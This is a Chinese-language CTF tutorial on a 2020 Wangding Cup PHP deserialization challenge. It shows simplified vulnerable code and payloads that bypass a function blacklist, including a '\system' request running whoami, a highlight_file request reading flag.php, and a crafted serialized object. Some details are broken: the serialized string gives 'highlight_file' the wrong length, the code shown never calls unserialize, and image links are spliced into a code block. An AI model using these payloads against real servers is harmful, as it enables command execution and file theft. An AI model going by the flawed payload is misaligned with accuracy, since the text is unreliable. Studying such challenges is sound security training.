# CTF-Web历年考题精讲教程：P7：网鼎杯2020朱雀组反序列化解题 🚩

在本节课中，我们将要学习一道来自“网鼎杯2020朱雀组”的CTF-Web题目。这道题的核心是PHP反序列化漏洞的利用。我们将详细分析源代码，逐步讲解如何绕过黑名单过滤，并最终通过反序列化执行任意代码或读取敏感文件。课程内容将尽可能简单直白，确保初学者能够理解。

![](img/6499c0787657daf064f94b0ceae62a3b_1.png)

## 题目概述与代码分析 🔍

首先，我们来看一下题目的核心源代码。代码的主要逻辑是接收两个参数，并对传入的函数名进行黑名单检查，然后动态调用函数。

```php
// 示例代码结构
$func = $_REQUEST['func'];
$p = $_REQUEST['p'];

// 黑名单数组
$blacklist = ["system", "exec", "shell_exec", "passthru", ...];

![](img/6499c0787657daf064f94b0ceae62a3b_3.png)

if (!in_array($func, $blacklist)) {
    // 动态调用函数
    $result = call_user_func($func, $p);
    if (is_string($result)) {
        echo $result;
    }
}
```

![](img/6499c0787657daf064f94b0ceae62a3b_5.png)

![](img/6499c0787657daf064f94b0ceae62a3b_7.png)

此外，代码中还存在一个类，其中包含 `__destruct` 魔术方法，在对象销毁时会调用 `call_user_func`。

```php
class Example {
    public $data;
    public function __destruct() {
        if ($this->data != null) {
            call_user_func($this->data['func'], $this->data['p']);
        }
    }
}
```

![](img/6499c0787657daf064f94b0ceae62a3b_9.png)

![](img/6499c0787657daf064f94b0ceae62a3b_10.png)

上一节我们介绍了题目的基本代码结构，本节中我们来看看如何利用这些代码。

![](img/6499c0787657daf064f94b0ceae62a3b_12.png)

![](img/6499c0787657daf064f94b0ceae62a3b_14.png)

## 绕过黑名单的第一种方法 🛡️

![](img/6499c0787657daf064f94b0ceae62a3b_16.png)

![](img/6499c0787657daf064f94b0ceae62a3b_18.png)

黑名单过滤了一些危险的函数，如 `system`、`exec` 等。但我们可以使用一些未被过滤的函数来达到目的。

![](img/6499c0787657daf064f94b0ceae62a3b_20.png)

![](img/6499c0787657daf064f94b0ceae62a3b_22.png)

![](img/6499c0787657daf064f94b0ceae62a3b_24.png)

以下是几种可用的函数：
*   `highlight_file`： 用于读取文件内容。
*   `readfile`： 同样用于读取文件。
*   使用命名空间绕过： 在某些PHP版本中，可以使用 `\` 来调用函数，例如 `\system`，这可能绕过基于字符串的简单匹配。

![](img/6499c0787657daf064f94b0ceae62a3b_26.png)

例如，我们可以构造如下请求来读取 `flag.php` 文件：
```
?func=highlight_file&p=flag.php
```
或者尝试使用命名空间（如果PHP版本支持）：
```
?func=\system&p=whoami
```

![](img/6499c0787657daf064f94b0ceae62a3b_28.png)

## 利用反序列化漏洞 🎯

除了直接调用函数，题目中类的 `__destruct` 方法为我们提供了另一条利用路径。我们可以构造一个恶意的序列化字符串，在反序列化时触发 `call_user_func`。

![](img/6499c0787657daf064f94b0ceae62a3b_30.png)

以下是构造反序列化Payload的步骤：
1.  实例化 `Example` 类。
2.  设置其 `data` 属性为一个数组，包含要执行的函数名和参数。
3.  序列化该对象。
4.  将序列化后的字符串作为参数传递。

![](img/6499c0787657daf064f94b0ceae62a3b_32.png)

![](img/6499c0787657daf064f94b0ceae62a3b_34.png)

![](img/6499c0787657daf064f94b0ceae62a3b_35.png)

```php
// 构造Payload的示例代码
class Example {
    public $data;
}
$obj = new Example();
$obj->data = ['func' => 'highlight_file', 'p' => 'flag.php'];
$payload = serialize($obj);
echo $payload;
```

![](img/6499c0787657daf064f94b0ceae62a3b_37.png)

![](img/6499c0787657daf064f94b0ceae62a3b_39.png)

生成的Payload类似：
```
O:7:"Example":1:{s:4:"data";a:2:{s:4:"func";s:13:"highlight_file";s:1:"p";s:8:"flag.php";}}
```

![](img/6499c0787657daf064f94b0ceae62a3b_41.png)

![](img/6499c0787657daf064f94b0ceae62a3b_43.png)

![](img/6499c0787657daf064f94b0ceae62a3b_45.png)

我们可以将这个Payload通过 `func` 或 `p` 参数传递（具体取决于代码如何解析），触发反序列化，从而执行我们设定的函数。

![](img/6499c0787657daf064f94b0ceae62a3b_47.png)

![](img/6499c0787657daf064f94b0ceae62a3b_48.png)

![](img/6499c0787657daf064f94b0ceae62a3b_50.png)

![](img/6499c0787657daf064f94b0ceae62a3b_52.png)

## 解题过程与总结 📝

![](img/6499c0787657daf064f94b0ceae62a3b_54.png)

本节课中我们一起学习了如何解决这道反序列化题目。我们首先分析了代码逻辑，找到了两处可利用点：一是直接调用未被过滤的函数来读取文件；二是通过构造恶意序列化对象，利用 `__destruct` 魔术方法间接执行函数。

![](img/6499c0787657daf064f94b0ceae62a3b_56.png)

![](img/6499c0787657daf064f94b0ceae62a3b_58.png)

关键点总结：
*   **核心思路**： 利用 `call_user_func($func, $p)` 实现代码执行。
*   **绕过过滤**： 使用黑名单外的函数（如 `highlight_file`）或命名空间技巧。
*   **反序列化利用**： 构造包含 `call_user_func` 调用链的序列化字符串，触发 `__destruct` 方法。
*   **最终目标**： 读取服务器上的 `flag.php` 文件以获取flag。

![](img/6499c0787657daf064f94b0ceae62a3b_60.png)

![](img/6499c0787657daf064f94b0ceae62a3b_62.png)

![](img/6499c0787657daf064f94b0ceae62a3b_64.png)

通过这道题，我们不仅学习了PHP反序列化的基本利用，也掌握了在存在过滤的情况下如何灵活寻找替代方案。下节课我们将继续探讨其他序列化相关的CTF题目。